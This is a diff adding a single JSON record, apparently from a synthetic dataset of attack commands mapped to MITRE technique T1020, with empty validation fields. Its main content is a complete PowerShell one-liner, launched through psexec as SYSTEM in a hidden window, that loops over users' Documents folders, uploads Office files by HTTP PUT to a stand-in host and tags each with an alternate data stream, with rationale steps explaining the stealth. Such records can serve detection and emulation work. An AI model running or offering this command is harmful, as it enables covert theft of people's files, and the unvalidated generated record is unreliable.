@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; while ($true){ Get-ChildItem 'C:\\Users\\*\\Documents' -Include *.docx,*.xlsx -Recurse -File | Where-Object { -not (Get-Item -Path $_.FullName -Stream 'exfil' -ErrorAction SilentlyContinue) } | ForEach-Object { try { Invoke-WebRequest -Uri ('https://exfil.example.net/drop/' + $_.Name) -Method Put -InFile $_.FullName -UseBasicParsing | Out-Null; Set-Content -Path $_.FullName -Stream 'exfil' -Value 'sent' -ErrorAction SilentlyContinue } catch {} }; Start-Sleep 900 }\"",
+  "explanation": "Automates exfiltration of office documents via HTTP PUT and tags files with an alternate data stream to prevent re-sending.",
+  "rationale_steps": [
+    "Launch as SYSTEM with PSExec to avoid user prompts and run hidden.",
+    "Recursively enumerate target document types across user folders.",
+    "Upload files using Invoke-WebRequest PUT to a remote drop endpoint.",
+    "Write an 'exfil' ADS marker to each successfully uploaded file.",
+    "Sleep and repeat to maintain ongoing automated exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-2bad4b07",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
